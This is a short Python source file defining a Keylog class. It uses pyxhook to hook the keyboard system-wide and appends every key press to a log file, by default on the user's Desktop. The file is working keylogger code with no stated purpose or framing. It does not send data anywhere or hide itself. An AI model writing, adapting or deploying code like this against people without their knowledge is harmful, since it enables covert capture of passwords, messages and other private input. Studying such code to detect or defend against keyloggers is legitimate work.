import os
import pyinotify
import shutil
import pyxhook


class Keylog:
    def __init__(self):
        self.log_file = os.environ.get('pylogger_file', os.path.expanduser('~/Desktop/file.log'))
        self.new_hook = pyxhook.HookManager()

    def start_keylogger(self):
        def OnKeyPress(event):
            with open(self.log_file, 'a') as f:
                if event.Key == "Return":
                    event.Key = "\n"
                f.write('{}'.format(event.Key))

        self.new_hook.KeyDown = OnKeyPress
        self.new_hook.HookKeyboard()
        try:
            self.new_hook.start()
        except KeyboardInterrupt:
            pass
        except Exception as ex:
            msg = 'Error while catching events:\n  {}'.format(ex)
            with open(self.log_file, 'a') as f:
                f.write('\n{}'.format(msg))

    def stop_keylogger(self):
        self.new_hook.cancel()

